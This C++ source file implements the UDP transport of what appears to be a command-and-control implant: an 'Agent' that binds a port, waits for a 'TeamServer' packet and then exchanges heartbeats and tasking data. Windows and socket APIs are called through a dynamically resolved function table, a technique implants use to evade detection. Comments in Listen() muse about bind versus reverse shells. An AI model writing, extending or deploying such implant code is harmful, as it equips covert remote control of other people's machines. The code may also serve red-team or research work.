#include "ConnectorUDP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "utils.h"

void* ConnectorUDP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorUDP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorUDP));
}

ConnectorUDP::ConnectorUDP()
{
    this->functions = (UDPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(UDPFUNC));

    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
    this->functions->LocalFree    = ApiWin->LocalFree;
    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
    this->functions->GetLastError = ApiWin->GetLastError;
    this->functions->GetTickCount = ApiWin->GetTickCount;

	this->functions->WSAStartup		 = ApiWin->WSAStartup;
	this->functions->WSACleanup		 = ApiWin->WSACleanup;
	this->functions->socket			 = ApiWin->socket;
	this->functions->ioctlsocket	 = ApiWin->ioctlsocket;
	this->functions->WSAGetLastError = ApiWin->WSAGetLastError;
	this->functions->closesocket	 = ApiWin->closesocket;
	this->functions->bind			 = ApiWin->bind;
	this->functions->select			 = ApiWin->select;
	this->functions->__WSAFDIsSet	 = ApiWin->__WSAFDIsSet;
	this->functions->sendto		     = ApiWin->sendto;
	this->functions->recvfrom		 = ApiWin->recvfrom;
	this->functions->shutdown		 = ApiWin->shutdown;
}

BOOL ConnectorUDP::SetConfig(ProfileUDP profile, BYTE* beat, ULONG beatSize)
{
	this->port = profile.port;

	WSAData WSAData;
	if (this->functions->WSAStartup(514u, &WSAData) < 0)
		return FALSE;

	SOCKET sock = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1)
		return FALSE;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = ((this->port >> 8) & 0x00FF) | ((this->port << 8) & 0xFF00); // port
	saddr.sin_addr.s_addr = 0; // INADDR_ANY

	if (this->functions->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr)) == -1) {
		this->functions->closesocket(sock);
		return FALSE;
	}

	this->prepend = profile.prepend;
	this->SrvSocket = sock;
	return TRUE;
}

void ConnectorUDP::SendData(BYTE* data, ULONG data_size)
{
    this->recvSize = 0;

    if (data && data_size) {
        // Send data directly without length header
        this->functions->sendto(this->SrvSocket, (const char*)data, data_size, 0, (struct sockaddr*)&this->ClientAddr, this->ClientAddrLen);
    }

	bool alive = false;
	ULONG endTime = this->functions->GetTickCount() + 2500;
	while (this->functions->GetTickCount() < endTime) {

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = this->SrvSocket;
		timeval timeout = { 0, 100 };

		int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult > 0) {
			alive = true;
			break;
		}
	}

	if (!alive) {
		this->recvSize = -1;
		return;
	}

    DWORD totalBytesAvail = 0;
	int result = this->functions->ioctlsocket(this->SrvSocket, FIONREAD, &totalBytesAvail);
    if (result != -1 && totalBytesAvail > 0) {
        
        if (totalBytesAvail > this->allocaSize) {
             this->recvData   = (BYTE*)this->functions->LocalReAlloc(this->recvData, totalBytesAvail, 0);
             this->allocaSize = totalBytesAvail;
        }

        int addrLen = sizeof(struct sockaddr_in);
        // Read full packet
        int bytesRead = this->functions->recvfrom(this->SrvSocket, (char*)this->recvData, this->allocaSize, 0, (struct sockaddr*)&this->ClientAddr, &addrLen);
        
        if (bytesRead != -1 && bytesRead > 0) {
            this->ClientAddrLen = addrLen;
            this->recvSize = bytesRead;
        } else {
            this->recvSize = -1;
        }
    }
}

BYTE* ConnectorUDP::RecvData()
{
    return this->recvData;
}

int ConnectorUDP::RecvSize()
{
    return this->recvSize;
}

void ConnectorUDP::RecvClear()
{
	if (this->recvData && this->allocaSize) {
		if (this->recvSize > 0)
			memset(this->recvData, 0, this->recvSize);
		else
			memset(this->recvData, 0, this->allocaSize);
	}
}

void ConnectorUDP::Listen()
{
    // For UDP, just prepare buffer. Reception handled in SendData (Heartbeat) or separate loop?
    // Listen in Agent usually waits for an initial command or just setups.
    // In TCP it Accepts. In UDP there is no Accept.
    // We just alloc buffer.

    this->recvData = (BYTE*)this->functions->LocalAlloc(LPTR, 0x100000);
    this->allocaSize = 0x100000;

	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = this->SrvSocket;

	// Wait for a packet to know we are connected? 
	// Or just return? TCP Listen() accepts. 
	// If we return, the main loop calls RecvData/SendData.
	// But we need ClientAddr from somewhere if we are a "server" listener?
	// Wait, this is the AGENT. 
	// The Agent CONNECTS to the TeamServer (Listener).
	// So Agent->Connect().
	// But `ConnectorUDP.cpp` has `Listen`. 
    // In `ConnectorTCP.cpp`, `Listen` calls separate `accept`. 
    // Is this a Bind/Reverse shell or Reverse connection?
    // ProfileUDP has `port`. 
    // If it's a listener on the agent side (Bind), then we wait for TS to send us a packet.
    // If it's Reverse, we should be sending first.
    // The previous code did `select` then `recvfrom(PEEK)`.
    // I will keep the logic: Wait for a packet to populate ClientAddr.

	while (1) {
		int sel = this->functions->select(0, &readfds, 0, 0, NULL);
        // Check for readability
		if (sel > 0 && (readfds.fd_array[0] == this->SrvSocket || this->functions->__WSAFDIsSet(this->SrvSocket, &readfds))) {
            
            char buf[1];
            int addrLen = sizeof(struct sockaddr_in);
            // PEEK to populate ClientAddr so we know where to reply
            int res = this->functions->recvfrom(this->SrvSocket, buf, 1, MSG_PEEK, (struct sockaddr*)&this->ClientAddr, &addrLen);
            if (res != -1) {
                this->ClientAddrLen = addrLen;
                break;
            }
		}
	}
}

void ConnectorUDP::Disconnect()
{
    if (this->allocaSize && this->recvData) {
        memset(this->recvData, 0, this->allocaSize);
        this->functions->LocalFree(this->recvData);
        this->recvData = NULL;
    }

    this->allocaSize = 0;
    this->recvData = 0;
    // UDP doesn't really disconnect, but we can reset
    memset(&this->ClientAddr, 0, sizeof(this->ClientAddr));
    this->ClientAddrLen = 0;
}

void ConnectorUDP::CloseConnector()
{
	this->functions->closesocket(this->SrvSocket);
}
